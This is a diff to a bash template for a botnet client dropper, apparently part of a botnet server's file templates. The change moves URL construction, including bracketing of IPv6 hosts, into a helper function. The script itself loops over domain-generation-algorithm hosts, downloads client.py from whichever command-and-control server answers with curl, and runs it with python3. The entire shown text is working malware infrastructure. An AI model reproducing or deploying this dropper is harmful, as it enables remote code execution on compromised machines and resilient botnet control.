@@ -38,18 +38,29 @@ python3 client.py &
 
 BotnetServerFileTemplates['client_dropper_runner_dga'] = '''\
 #!/bin/bash
+format_dropper_url() {
+    local host="$1"
+    if [[ "$host" =~ ^https?:// ]]; then
+        echo "$host"
+        return
+    fi
+
+    local authority="$host"
+    if [[ "$authority" == *:* && "${authority:0:1}" != "[" ]]; then
+        local colon_count="${authority//[^:]}"
+        if [ "${#colon_count}" -gt 1 ]; then
+            authority="[$authority]"
+        fi
+    fi
+
+    echo "http://$authority/clients/droppers/client.py"
+}
+
 chmod +x /dga
 while true; do {
     host="`/dga | shuf -n1`"
     echo "botnet-client: dga: trying $host..."
-    if [[ "$host" =~ ^https?:// ]]; then
-        url="$host"
-    else
-        if [[ "$host" == *:* && "${host:0:1}" != "[" ]]; then
-            host="[$host]"
-        fi
-        url="http://$host/clients/droppers/client.py"
-    fi
+    url="$(format_dropper_url "$host")"
     curl -sHf "$url" -o client.py && {
         echo "botnet-client: dga: $host works!"
         python3 client.py
